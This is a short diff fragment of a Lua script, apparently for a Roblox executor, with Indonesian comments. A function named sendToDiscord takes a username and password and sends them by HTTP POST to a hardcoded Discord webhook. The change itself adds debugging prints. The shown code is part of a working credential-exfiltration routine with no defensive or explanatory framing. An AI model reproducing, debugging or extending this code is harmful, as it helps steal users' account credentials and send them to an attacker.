@@ -3,8 +3,10 @@ local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlI
 
 -- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password)
+    print("Fungsi sendToDiscord dipanggil") -- Debugging
     if syn and syn.request then
-        -- Menggunakan syn.request untuk mengirim data
+        print("Executor mendukung syn.request") -- Debugging
+        -- Membuat permintaan HTTP
         local response = syn.request({
             Url = webhook_url,
             Method = "POST",
